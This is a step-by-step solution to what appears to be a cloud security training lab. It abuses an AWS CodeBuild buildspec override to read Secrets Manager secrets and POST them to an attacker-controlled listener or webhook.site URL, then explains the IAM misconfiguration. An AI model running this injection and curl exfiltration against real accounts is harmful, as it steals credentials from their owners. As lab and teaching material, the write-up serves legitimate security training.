# Cheat Sheet — codebuild_secrets_exfil

## Setup

```bash
# Configure the starting profile using the credentials from start.txt
aws configure --profile bob
# Enter the access key ID, secret access key, and your preferred region (e.g. us-east-1)
```

---

## Step 1 — Enumerate CodeBuild Projects

```bash
aws codebuild list-projects --profile bob
```

Note the project name — it will look like `cg-vulnerable-project-<cgid>`.

---

## Step 2 — Inspect the Project (Optional but Informative)

```bash
aws codebuild batch-get-projects \
  --names cg-vulnerable-project-<cgid> \
  --profile bob
```

Observe the `serviceRole` ARN in the output. This confirms the project runs with a privileged role.

---

## Step 3 — Set Up a Listener

On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret:

```bash
# Option A — Python one-liner
python3 -m http.server 4444

# Option B — Use a public endpoint service such as https://webhook.site
# Copy the unique URL it gives you
```

Make note of your listener URL, e.g. `http://<your-public-ip>:4444` or the webhook.site URL.

---

## Step 4 — Inject Inline Buildspec and Start the Build

Replace `<project-name>` and `<listener-url>` with your values.

```bash
aws codebuild start-build \
  --project-name cg-vulnerable-project-<cgid> \
  --buildspec-override '
version: 0.2
phases:
  build:
    commands:
      - SECRET_NAME=$(aws secretsmanager list-secrets --query "SecretList[0].Name" --output text)
      - VALUE=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query "SecretString" --output text)
      - curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
' \
  --profile bob
```

Note the `id` returned in the response — you can use it to track the build.

---

## Step 5 — Monitor the Build (Optional)

```bash
aws codebuild batch-get-builds \
  --ids <build-id> \
  --profile bob
```

Wait until `buildStatus` changes from `IN_PROGRESS` to `SUCCEEDED`.

---

## Step 6 — Collect the Secret

Check your listener. The secret value (the flag) will arrive as a POST body within a few seconds of the build reaching the `build` phase.

Example output at listener:
```
{"flag":"cg-secret-flag-<cgid>"}
```

**Scenario complete.**

---

## Key Vulnerability

`codebuild:StartBuild` accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime. There is no restriction preventing a caller from injecting arbitrary shell commands. Combined with a service role that holds `secretsmanager:GetSecretValue` on `*`, any identity that can start a build can effectively exfiltrate any secret in the account — even without holding Secrets Manager permissions themselves.
